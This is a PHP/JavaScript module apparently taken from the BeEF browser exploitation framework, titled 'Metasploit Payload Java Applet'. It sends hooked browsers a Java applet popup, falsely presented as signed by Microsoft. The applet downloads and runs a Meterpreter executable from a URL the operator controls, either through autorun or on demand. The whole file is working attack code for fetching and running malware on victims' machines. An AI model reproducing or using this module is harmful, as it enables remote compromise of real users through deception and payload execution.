<?
    // Copyright (c) 2006-2009, Wade Alcorn 
    // All Rights Reserved
    // wade@bindshell.net - http://www.bindshell.net
    //
    // Module by:   Joshua "Jabra" Abraham 
    // jabra@spl0it.org
    // http://blog.spl0it.org
    // 
	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<script>
	function get_b64_code_msf_applet() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';

		// do some super escaping 		
		msfcmd_str = document.myform.msfcmd.value;
        
        // replace sections of the code with user input
        b64code = b64replace(b64code, "BAR",msfcmd_str);
        b64code = b64replace(b64code, "FOO",msfcmd_str);

		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('Mozilla nsIProcess Interface', get_b64_code_msf_applet());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_msf_applet());
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Metasploit Payload Java Applet</div>
This module will execute a command on the client. The client will receive a Java Applet popup. <br><br>
The certificate is self-signed by the Microsoft Corporation.<br><br>

<div id="module_subsection">
	<form name="myform">
                <div id="module_subsection_header">URL to Download Meterpreter Payload</div>
                <input type="text" name="msfcmd" value="http://<?=$_SERVER['SERVER_NAME']?>/beef/beef.exe"/>
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
	</form>
</div>

